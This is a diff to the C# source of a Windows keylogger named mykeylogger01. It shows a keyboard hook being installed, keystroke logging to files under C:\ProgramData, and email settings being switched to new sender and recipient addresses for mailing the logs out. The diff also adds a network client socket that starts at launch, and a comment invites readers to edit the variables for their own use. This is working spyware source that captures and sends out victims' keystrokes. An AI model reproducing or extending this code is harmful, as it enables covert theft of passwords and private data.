@@ -5,15 +5,16 @@ using System.Windows.Forms;
 using System.IO;
 using System.Net.Mail;
 using System.Net;
+using Networking;
 
 namespace mykeylogger01
 {
     class Program
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        private const string FROM_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "dontlogintome";
-        private const string TO_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
+        private const string FROM_EMAIL_ADDRESS = "dfuzzwubfratdedbwx@tcwlm.com";
+        private const string FROM_EMAIL_PASSWORD = "";
+        private const string TO_EMAIL_ADDRESS = "smithcl6@vcu.edu";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
@@ -29,6 +30,8 @@ namespace mykeylogger01
         
         static void Main(string[] args)
         {
+            Client client = new Client();
+            client.clientSocket();
             hook = SetHook(llkProcedure);
             Application.Run();
             UnhookWindowsHookEx(hook);
@@ -67,6 +70,13 @@ namespace mykeylogger01
                 }
                 catch(Exception e)
                 {
+                    Console.Out.WriteLine(e.Message);
+                }
+
+                try {
+
+                }
+                catch(Exception e) {
                     Console.Out.WriteLine(e.Message);
                 }
             }
